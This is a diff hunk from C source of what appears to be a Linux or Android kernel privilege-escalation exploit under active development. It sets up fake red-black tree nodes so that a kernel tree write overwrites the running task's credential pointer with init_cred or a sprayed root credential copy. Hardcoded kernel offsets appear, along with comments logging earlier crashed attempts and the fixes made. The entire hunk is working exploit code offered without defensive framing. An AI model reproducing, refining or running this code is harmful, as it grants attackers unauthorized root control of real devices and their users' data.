@@ -873,35 +873,48 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                     (unsigned long long)tree_l);
           } else if (env_flag("MODE4_SLIDE_CRED", 0)) {
             /*
-             * Z6 used VALUE=P0(init_cred). only-left __rb_change_child
-             * then wrote the cred_slot pointer into init_cred+8/+16 and
-             * the framework died (unknown SID / zygote gone). VALUE is
-             * the sprayed cred copy instead: smash stays on our page.
-             *   parent_color = VALUE = cred_copy (red)
-             *   left         = TARGET = task.cred slot
-             *   right        = 0
-             * → *task.cred = cred_copy (uid=0, huge usage).
+             * *task.cred = init_cred (or sprayed copy). only-left:
+             *   pc = VALUE, left = cred_slot, right = 0
+             * child->__rb_parent_color writes VALUE into *slot.
+             * change_child extra store is at VALUE+8 (init_cred.gid if
+             * uid@+4) — not selinux_state. Z16 died on a second KS spray
+             * after park; this walk is spray-free BSS overlay like W1.
              */
             {
               uint64_t ztgt = (uint64_t)pselect_write_target();
-              uint64_t copy = (uint64_t)g_cred_copy & ~1ULL;
+              /* Z22/Z24: BSS-zero as cred lived the walk then panicked
+               * (user_ns NULL). Z17 init_cred KP used dirty W1 lock;
+               * retry init_cred with BSS tail lock. gid/suid at +8/+12
+               * are 0 → rb left/right 0. */
+              uint64_t ic_off =
+                  (active_offsets && active_offsets->off_init_cred)
+                      ? (uint64_t)active_offsets->off_init_cred
+                      : 0x027E0BE0ULL;
+              uint64_t val = g_cred_copy
+                                 ? (uint64_t)g_cred_copy
+                                 : (uint64_t)data_addr(KIMAGE_TEXT_BASE +
+                                                       ic_off);
               uint64_t it_off =
                   (active_offsets && active_offsets->off_init_task)
                       ? (uint64_t)active_offsets->off_init_task
                       : (uint64_t)INIT_TASK_OFF;
-              tree_pc = copy;
+              tree_pc = val & ~1ULL;
               tree_r = 0;
               tree_l = ztgt;
               pi_parent = 0;
               pi_right = 0;
               pi_left = 0;
               stack_task = data_addr(KIMAGE_TEXT_BASE + it_off);
-              stack_lock = data_addr(KIMAGE_TEXT_BASE + it_off + 0x878ULL);
+              stack_lock = data_addr(KIMAGE_TEXT_BASE +
+                  (active_offsets && active_offsets->off_bss_tail_lock
+                       ? (uint64_t)active_offsets->off_bss_tail_lock
+                       : 0x02BB9D00ULL));
               stack_prio = 3;
               stack_deadline = 0;
-              pr_info("stack mode4 SLIDE_CRED: *%016llx = cred_copy "
-                      "%016llx (BSS lock, not init_cred)\n",
-                      (unsigned long long)ztgt, (unsigned long long)copy);
+              pr_info("stack mode4 SLIDE_CRED: *%016llx = %016llx "
+                      "(%s) BSS tail lock\n",
+                      (unsigned long long)ztgt, (unsigned long long)val,
+                      g_cred_copy ? "cred_copy" : "init_cred");
             }
           } else if (env_flag("MODE4_SLIDE_ZERO", 0)) {
             /*
